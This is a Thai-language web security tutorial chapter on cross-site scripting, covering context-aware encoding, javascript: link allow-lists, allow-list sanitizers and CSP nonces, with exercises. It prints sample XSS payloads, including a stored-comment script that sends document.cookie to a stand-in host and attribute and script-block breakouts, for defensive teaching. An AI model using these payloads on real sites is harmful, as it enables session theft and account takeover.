## ความเห็นที่มี Script ปนมา

ร้านของนาย A มีหน้ารีวิวสินค้า ลูกค้าพิมพ์ความเห็น แล้วหน้าเว็บเอาไปแสดงให้คนอื่นเห็น (รัน: `exercises/09_xss.py`)

```python
def page_naive(comment):
    return f"<html><body><h1>Reviews</h1><p>{comment}</p></body></html>"

COMMENT = '<script>fetch("https://evil.test/?c="+document.cookie)</script>'
```

ถ้ามีคนพิมพ์ความเห็นเป็นบรรทัดข้างบน HTML ที่ได้จะมี `<script>` อยู่ในย่อหน้า พอ Browser ของลูกค้าคนถัดไปเปิดหน้านี้ มันไม่รู้ว่า Script นั้นมาจากความเห็น มันเห็นเป็นส่วนหนึ่งของหน้าเว็บของร้าน และรันด้วยสิทธิ์ของเว็บร้านนั้น ซึ่งอ่าน Cookie ที่ไม่มี `HttpOnly` ได้ตามที่เราเห็นในบทที่เกี่ยวกับ Session นี่คือ **XSS (Cross-Site Scripting)** แบบ Stored เพราะความเห็นถูกเก็บไว้แล้วเสิร์ฟให้ทุกคน (หนังสือ: Web Application Security บทที่ 10 หน้า 121)

เราไม่มี Browser จริงในแบบฝึกนี้ จึงให้ Parser ของ HTML จาก Python ซึ่งสร้างเหตุการณ์ชนิดเดียวกับที่ Browser สร้าง (Tag เริ่มต้นกับ Attribute) มาดูแทน ผลที่ได้คือหน้าแบบเดิมมี Element `script` เพิ่มขึ้นมาที่ไม่มีใครเขียน ส่วนอีกแบบที่ผ่าน `html.escape` ไม่มี

ต้นเหตุเหมือน[บทที่แล้ว](/app-security/injection/) ข้อความของผู้ใช้กลายเป็นโค้ด ครั้งนี้ผู้อ่านคือ Browser ที่เปิดหน้าเว็บ และวิธีแก้ก็ตามหลักเดียวกัน คือ **Encode ตอนแสดงผล** ให้ข้อความยังเป็นข้อความ

## Encode ให้ตรงกับที่ที่ข้อความไปอยู่

`html.escape` เปลี่ยน `< > & " '` เป็น `&lt; &gt; &amp; &quot; &#x27;` แบบฝึก Assert ว่าได้ตามนั้น เมื่อใช้กับเนื้อหาของย่อหน้า Script ไม่ถูกสร้าง และตัวความเห็นก็ยังแสดงให้ผู้ใช้เห็นเป็นข้อความตามที่พิมพ์

แต่การ Encode ที่ถูกต้องขึ้นกับว่าข้อความไปอยู่ **ที่ไหน** ของหน้า ลองเลือกทีละตำแหน่งในแล็บข้างล่าง ใช้ข้อความโจมตีของตำแหน่งนั้น แล้วสลับ Encode ระหว่างไม่ทำกับทำให้ตรงที่ ดูว่า Browser สร้างอะไรขึ้นมาไม่เหมือนกันทั้งสามตำแหน่ง ส่วนที่ไฮไลต์ในหน้าคือข้อความของผู้ใช้

<XssLab client:visible />

ตำแหน่งแรกคือเนื้อหา HTML ซึ่งข้างบนคือกรณีง่ายที่สุด ตำแหน่งที่สองคือค่าของ Attribute ที่มีเครื่องหมาย `"` ครอบอยู่ ข้อความโจมตี `" onfocus="alert(1)" autofocus="` ปิดค่าด้วยเครื่องหมาย `"` ตัวแรก ทำให้ `onfocus` กลายเป็น Attribute ใหม่ของ `<input>` จริง ๆ ส่วน `html.escape` แปลง `"` เป็น `&quot;` ค่าจึงไม่ถูกปิดก่อนเวลา แบบฝึกยังเช็กด้วยว่าถ้าไม่มีเครื่องหมาย `"` ครอบค่า Attribute ช่องว่างตัวเดียวก็ปิดค่าได้ `html.escape` อย่างเดียวจึงไม่พอ ต้องใส่เครื่องหมายครอบเสมอ

ตำแหน่งที่สามคือค่าที่ใส่ในบล็อก `<script>` ตรงนี้ `html.escape` ใช้ไม่ได้ผลตามที่เราคิด เพราะ Browser อ่านเนื้อใน `<script>` เป็น JavaScript ไม่ใช่ HTML ที่ต้องถอดรหัสก่อน ทางที่ถูกคือเขียนค่าเป็นสตริงของ JavaScript ด้วย `json.dumps` และเขียน `<` เป็น `\u003c` ด้วย เพราะข้อความ `</script>` ในสตริงจะปิดบล็อกก่อนเวลาแม้อยู่ในเครื่องหมายคำพูด แบบฝึกลองค่า `</script><img src=x onerror=alert(1)>` Parser เห็น `<img onerror=...>` โผล่ออกมาเมื่อไม่ได้เขียน `<` เป็น `\u003c` แต่ไม่เห็นเมื่อเขียน (หนังสือ: Web Application Security บทที่ 22 หน้า 240 เรื่อง HTML Entity Encoding)

</Step>

## ลิงก์ที่ Escape แล้วก็ยังรันได้

มีอีกกรณีที่ Encode ไม่ช่วยเลย คือ URL ในลิงก์ ถ้าผู้ใช้ใส่ที่อยู่เว็บส่วนตัวของตัวเองในโปรไฟล์ แล้วเราทำเป็น `<a href="...">` ผู้ใช้อาจใส่ `javascript:alert(document.cookie)` ซึ่งไม่มีอักขระที่ `html.escape` แปลงเลย แบบฝึกเช็กว่า `href` ที่ได้ยังเป็น `javascript:...` อยู่ครบ จึงยังเป็นลิงก์ที่รัน Script เมื่อถูกกด

ทางแก้ที่ใช้ได้คือ **Allow List** ของ Scheme ในแบบฝึกอนุญาตเฉพาะ `http`, `https` และลิงก์สัมพัทธ์ (ไม่มี Scheme) ลิงก์ `javascript:` ถูกปฏิเสธ รวมถึงรูปแบบที่เขียนด้วยตัวใหญ่และมีช่องว่างข้างหน้า (`  JaVaScRiPt:alert(1)`) ที่ Browser อ่านออกเหมือนเดิม (หนังสือ: Web Application Security บทที่ 22 หน้า 239 เรื่อง Sanitizing Hyperlinks)

</Step>

## ถ้าต้องให้ผู้ใช้ใส่ HTML ได้บางส่วน

บางเว็บต้องการให้ผู้ใช้เขียนตัวหนา `<b>` ได้ ตรงนี้การ Encode ทั้งหมดไม่พอ เพราะเราอยากให้ `<b>` ทำงาน ทางที่ใช้คือ **Sanitizer แบบ Allow List** แบบฝึกเขียนตัวเล็ก ๆ ที่เก็บเฉพาะ `<b>` กับ `<i>` และทิ้ง Attribute ทุกตัว ข้อความที่ผู้ใช้ส่งเข้ามามี `<b onclick="x()">` กับ `<img onerror=...>` และ `<script>` ผลคือเหลือ `<b>shop</b>` ไม่มี Event Attribute เหลือเลย

ข้อควรระวังที่แบบฝึกเช็กเองคือ ข้อความภายใน `<script>alert(2)</script>` ที่ถูกทิ้ง Tag ไปแล้วยังเหลือเป็นข้อความธรรมดา `alert(2)` ซึ่งไม่รัน แต่ก็แสดงว่า Sanitizer ที่เขียนเองจะมีกรณีแปลก ๆ หลุดอยู่เสมอ ในงานจริง เราใช้ Sanitizer ที่คนดูแลต่อเนื่อง และเรื่องที่ยากกว่านั้นอย่าง Mutation XSS ที่ Browser แก้ HTML ที่เสียให้กลายเป็นอันตราย (หนังสือ: Web Application Security บทที่ 10 หน้า 128) ผู้เขียนไม่ได้รันในบทนี้

</Step>

## กำแพงอีกชั้น: Content Security Policy

ทุกกฎข้างบนต้องไม่พลาดเลยแม้แต่ที่เดียว **CSP** คือกำแพงอีกชั้น Server ส่ง Header ที่บอก Browser ว่า Script จากที่ไหนรันได้ ถ้า Script ที่ถูกฝังมาไม่ตรงเงื่อนไข Browser ไม่รัน

```text
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-ulO-UaueGw7spEFMRaC5GQ'; object-src 'none'
```

`nonce` คือค่าสุ่มที่ Server สร้างใหม่ในทุก Response และใส่ใน `<script nonce="...">` ของเราเอง Script ที่ฝังมาโดยผู้โจมตีไม่มี Nonce ที่ถูกต้อง จึงไม่ถูกรัน ผลที่แบบฝึก Assert ด้วยโมเดลของกฎ Script ของเราที่มี Nonce รันได้ Script ที่ฝังมาโดยไม่มี Nonce ถูกบล็อก ผู้โจมตีที่เดา Nonce จากหน้าเก่าก็ไม่ผ่านเพราะค่าเปลี่ยนทุก Response (Nonce ยาว 22 ตัวอักษร หรือ 128 บิต) แต่ถ้านโยบายมี `'unsafe-inline'` โดยไม่มี Nonce Script ที่ฝังมารันได้อีก สลับตัวเลือก CSP ในแล็บเมื่อกี้ดูได้ (หนังสือ: Web Application Security บทที่ 22 หน้า 242)

CSP เป็นชั้นสำรอง ไม่ใช่ตัวแทนของการ Encode ถ้าเราพึ่งมันอย่างเดียว ข้อความของผู้ใช้ก็ยังกลายเป็น HTML ที่ฝังมาในหน้าอยู่ดี ตัวที่ Script ยังรันไม่ได้แค่นั้นเอง

<Callout type="warn" title="ผลของ CSP ในแบบฝึกเป็นโมเดล">

แบบฝึกไม่มี Browser จริง ส่วนที่เป็นกฎของ Nonce กับ Unsafe-inline เขียนเป็นโค้ดจากสิ่งที่หนังสือและเอกสารอธิบาย ผลที่ได้บอกว่า ถ้า Browser ทำตามกฎนี้ ผลจะเป็นอย่างนี้ ไม่ได้ยืนยันกับ Chrome หรือ Firefox

</Callout>
